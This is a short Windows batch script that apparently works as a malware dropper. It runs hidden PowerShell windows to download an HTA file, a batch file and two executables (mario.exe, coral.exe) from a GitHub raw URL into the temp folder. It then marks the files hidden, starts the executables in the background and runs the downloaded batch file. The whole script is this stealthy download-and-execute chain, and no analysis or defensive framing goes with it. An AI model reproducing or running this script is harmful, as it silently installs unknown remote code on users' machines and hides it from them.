:top0 
timeout /t 1 & 
powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mathew.hta -Outfile %tmp%/mathew.hta
powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mat.bat -Outfile %tmp%/mat.bat
cmd /c attrib +h %tmp%/go.bat 
cmd /c attrib +h %tmp%/mathew.hta
cmd /c attrib +h %tmp%/mat.bat 
goto top1 

:top1 
timeout /t 1 & 
powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mario.exe -Outfile %tmp%/mario.exe
cmd /c attrib +h %tmp%/mario.exe 
cmd /c start /B %tmp%/mario.exe 
goto top2 

:top2 
timeout /t 1 & 
powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/coral.exe -Outfile %tmp%/coral.exe
cmd /c attrib +h %tmp%/coral.exe 
cmd /c start /B %tmp%/coral.exe 
goto top3 

:top3
timeout /t 1 &
cmd /c start /B %tmp%/mat.bat

